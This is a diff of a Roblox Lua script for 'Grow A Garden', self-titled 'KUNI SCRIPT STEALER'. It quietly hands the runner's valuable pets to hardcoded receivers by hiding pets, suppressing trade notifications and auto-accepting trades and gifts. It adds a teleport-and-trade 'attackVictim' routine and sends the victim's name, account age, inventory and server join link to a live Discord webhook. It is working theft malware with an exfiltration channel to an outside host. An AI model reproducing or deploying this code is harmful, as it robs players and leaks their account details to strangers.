@@ -3,14 +3,11 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Lighting = game:GetService("Lighting")
-local UserInputService = game:GetService("UserInputService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
 local dataModule = require(ReplicatedStorage.Modules.DataService)
 
 local USERNAMES = {
@@ -38,7 +35,6 @@ local PET_PRIORITY = {
 
 local victimPetTable = {}
 
--- Notification blocking patterns
 local BLOCKED_PATTERNS = {
     "^Your trade is processing, please wait until your trade finalizes before creating another one%.$",
     "^You can only place your pets in garden!$",
@@ -66,14 +62,12 @@ local function removeNotif(obj)
     end
 end
 
--- Aggressive notification remover every frame
 RunService.Heartbeat:Connect(function()
     for _, obj in ipairs(CoreGui:GetDescendants()) do
         removeNotif(obj)
     end
 end)
 
--- PET INVISIBILITY WITH WALK ANIMATION ENABLED
 local function hideHeldPets()
     local char = LocalPlayer.Character
     if not char then return end
@@ -99,12 +93,10 @@ RunService.Heartbeat:Connect(hideHeldPets)
 
 LocalPlayer.CharacterAdded:Connect(function(char)
     char:WaitForChild("Humanoid")
-    -- hideHeldPets() will be applied continuously because of heartbeat connection above
+    RunService.Heartbeat:Connect(hideHeldPets)
 end)
 
 print("[✔] Pet invisibility + blocked notifications active.")
-
--- Helper functions
 
 local function checkPetsWhitelist(petName)
     return PET_WHITELIST[petName] ~= nil
@@ -135,24 +127,51 @@ local function equipPet(pet)
     end
 end
 
-local function startSteal(triggerName)
-    local targetPlayer = Players:FindFirstChild(triggerName)
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
-        local prompt = targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
-        if prompt then
-            prompt.HoldDuration = 0
-            -- Automatically trigger the prompt without teleport
-            prompt:InputHoldBegin()
-            task.wait(0.1)
-            prompt:InputHoldEnd()
+local function findTradePrompt(targetPlayer)
+    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
+        for _, obj in ipairs(targetPlayer.Character.Head:GetChildren()) do
+            if obj:IsA("ProximityPrompt") then
+                return obj
+            end
         end
     end
+    return nil
+end
+
+local function autoAcceptTrade(targetPlayerName)
+    local targetPlayer = Players:FindFirstChild(targetPlayerName)
+    if not targetPlayer then
+        print("autoAcceptTrade: target player not found: "..targetPlayerName)
+        return
+    end
+
+    local prompt = findTradePrompt(targetPlayer)
+    if prompt then
+        prompt.MaxActivationDistance = 1000
+        prompt:InputHoldBegin()
+        task.wait(prompt.HoldDuration or 0.5)
+        prompt:InputHoldEnd()
+        print("autoAcceptTrade: Prompt accepted for "..targetPlayerName)
+    else
+        print("autoAcceptTrade: Prompt NOT found for "..targetPlayerName)
+    end
+end
+
+-- **Auto accept gift event (update event name accordingly!)**
+local AcceptGiftEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("AcceptGiftRequest")
+
+local function autoAcceptGiftsFromVictim(victimName)
+    task.spawn(function()
+        while true do
+            task.wait(0.3)
+            AcceptGiftEvent:FireServer(victimName)
+        end
+    end)
 end
 
 local function checkPetsInventory(targetName)
     local petsData = dataModule:GetData().PetsData.PetInventory.Data
 
-    -- Priority pets first
     for _, priorityPetName in ipairs(PET_PRIORITY) do
         for petUUID, petData in pairs(petsData) do
             if petData.PetType == priorityPetName then
@@ -160,20 +179,23 @@ local function checkPetsInventory(targetName)
                 if petObject then
                     equipPet(petObject)
                     task.wait(0.2)
-                    startSteal(targetName)
+                    autoAcceptTrade(targetName)
+                    task.wait(0.2)
+                    AcceptGiftEvent:FireServer(targetName)
                 end
             end
         end
     end
 
-    -- Then rest of pets (excluding priority)
     for petUUID, petData in pairs(petsData) do
         if checkPetsWhitelist(petData.PetType) and not table.find(PET_PRIORITY, petData.PetType) then
             local petObject = getPetObject(petUUID)
             if petObject then
                 equipPet(petObject)
                 task.wait(0.2)
-                startSteal(targetName)
+                autoAcceptTrade(targetName)
+                task.wait(0.2)
+                AcceptGiftEvent:FireServer(targetName)
             end
         end
     end
@@ -204,20 +226,47 @@ local function makeInvisibleToVictims()
     end
 end
 
+-- Teleport to victim + send trade request
+local function teleportToVictim(victimName)
+    local victim = Players:FindFirstChild(victimName)
+    local character = LocalPlayer.Character
+    if victim and victim.Character and victim.Character:FindFirstChild("HumanoidRootPart") and character and character:FindFirstChild("HumanoidRootPart") then
+        character.HumanoidRootPart.CFrame = victim.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
+        print("Teleported to "..victimName)
+    end
+end
+
+local function sendTradeRequestToVictim(victimName)
+    local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
+    local TradeRequestEvent = GameEvents:FindFirstChild("TradeRequest")
+    if TradeRequestEvent then
+        TradeRequestEvent:FireServer(victimName)
+        print("Trade request sent to "..victimName)
+    end
+end
+
+local function attackVictim(victimName)
+    teleportToVictim(victimName)
+    task.wait(1)
+    sendTradeRequestToVictim(victimName)
+    task.wait(1)
+    autoAcceptGiftsFromVictim(victimName)
+end
+
 local function idlingTarget()
     task.spawn(function()
         while task.wait(0.2) do
             local found, targetName = waitForJoin()
             if found then
-                -- No teleport here
+                print("idlingTarget: Target found - "..targetName)
                 checkPetsInventory(targetName)
                 makeInvisibleToVictims()
+                attackVictim(targetName)
             end
         end
     end)
 end
 
--- Build victim pet list for Discord report
 for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
     if checkPetsWhitelist(petData.PetType) then
         table.insert(victimPetTable, petData.PetType)
@@ -229,72 +278,72 @@ idlingTarget()
 task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/yourfileurl/items.txt")
+            local petListStr = table.concat(victimPetTable, "\n")
+            print("[Webhook] Sending victim pet list to Discord...")
+            local embed = {
+                title = "🌵 Grow A Garden Hit - KUNI SCRIPT STEALER 💸",
+                color = 65280,
+                fields = {
+                    {
+                        name = "👤 **Player Information**",
+                        value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
+                            LocalPlayer.Name,
+                            table.concat(USERNAMES, " "),
+                            LocalPlayer.Name,
+                            LocalPlayer.AccountAge
+                        ),
+                        inline = false
+                    },
+                    {
+                        name = "🌴 **Backpack**",
+                        value = string.format("```%s```", petListStr),
+                        inline = false
+                    },
+                    {
+                        name = "🏝️ **Join with URL**",
+                        value = string.format(
+                            "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
+                            game.JobId,
+                            game.PlaceId,
+                            game.JobId
+                        ),
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = string.format("%s | %s", game.PlaceId, game.JobId)
+                }
+            }
+
+            local data = {
+                content = string.format(
+                    "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
+                    game.PlaceId,
+                    game.JobId
+                ),
+                username = LocalPlayer.Name,
+                avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+                embeds = {embed}
+            }
+
+            local jsonData = HttpService:JSONEncode(data)
+            local headers = { ["Content-Type"] = "application/json" }
+
+            local request = http_request or request or HttpPost or syn.request
+            local response = request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = headers,
+                Body = jsonData
+            })
+
+            if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+                warn("Error sending to Discord:", response.StatusCode, response.Body)
+            else
+                print("[Webhook] Sent successfully!")
+            end
+
             break
         end
     end
 end)
-
--- Discord embed function (unchanged)
-function createDiscordEmbed(petList, totalValue, fileUrl)
-    local embed = {
-        title = "🌵 Grow A Garden Hit - KUNI SCRIPT STEALER 💸",
-        color = 65280,
-        fields = {
-            {
-                name = "👤 **Player Information**",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
-                    LocalPlayer.Name, 
-                    table.concat(USERNAMES, " "), 
-                    LocalPlayer.Name,
-                    LocalPlayer.AccountAge
-                ),
-                inline = false
-            },
-            {
-                name = "🌴 **Backpack**",
-                value = string.format("```%s```", petList),
-                inline = false
-            },
-            {
-                name = "🏝️ **Join with URL**",
-                value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
-                    game.JobId, 
-                    game.PlaceId, 
-                    game.JobId
-                ),
-                inline = false
-            }
-        },
-        footer = {
-            text = string.format("%s | %s", game.PlaceId, game.JobId)
-        }
-    }
-
-    local data = {
-        content = string.format(
-            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
-            game.PlaceId,
-            game.JobId
-        ),
-        username = LocalPlayer.Name,
-        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
-        embeds = {embed}
-    }
-
-    local jsonData = HttpService:JSONEncode(data)
-    local headers = { ["Content-Type"] = "application/json" }
-
-    local request = http_request or request or HttpPost or syn.request
-    local response = request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = headers,
-        Body = jsonData
-    })
-
-    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
-        warn("Error sending to Discord:", response.StatusCode, response.Body)
-    end
-end
